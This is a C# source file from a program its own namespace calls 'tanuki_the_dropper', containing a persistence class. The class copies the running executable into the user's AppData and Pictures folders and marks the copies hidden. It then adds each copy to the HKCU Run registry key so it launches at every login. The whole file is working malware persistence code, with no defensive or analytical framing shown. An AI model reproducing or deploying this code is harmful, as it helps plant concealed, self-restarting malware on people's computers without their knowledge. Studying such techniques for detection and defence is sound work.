using Microsoft.Win32;
using System;
using System.IO;

namespace tanuki_the_dropper
{
    public class Persistence
    {
        private string[] path_copies = new string[] { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) };

        public void SelfCopy()
        {
            string currentCopy = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

            if (currentCopy == null) { return; }

            int i = 0;
            foreach (string path in path_copies)
            {
                string copy = Path.Combine(path, "tanuki_the_dropper" + i.ToString() + ".exe");

                if (Directory.Exists(path))
                {
                    if (!File.Exists(copy))
                    {
                        try
                        {
                            File.Copy(currentCopy, copy, true);

                            try
                            {
                                File.SetAttributes(copy, File.GetAttributes(copy) | FileAttributes.Hidden);
                                Console.WriteLine("Hidden attribute set for file: " + copy);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Error setting hidden attribute for file: " + ex.Message);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Failed to copy: " + ex.Message);
                        }
                    }
                    
                    EditRegister(copy);
                    i++;
                }
            }
        }

        private void EditRegister(string filePath)
        {
            string keyName = Path.GetFileNameWithoutExtension(filePath);
            string value = filePath;

            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                registryKey.SetValue(keyName, value);

                registryKey.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not add program to registry: " + ex.Message);
            }
        }
    }
}
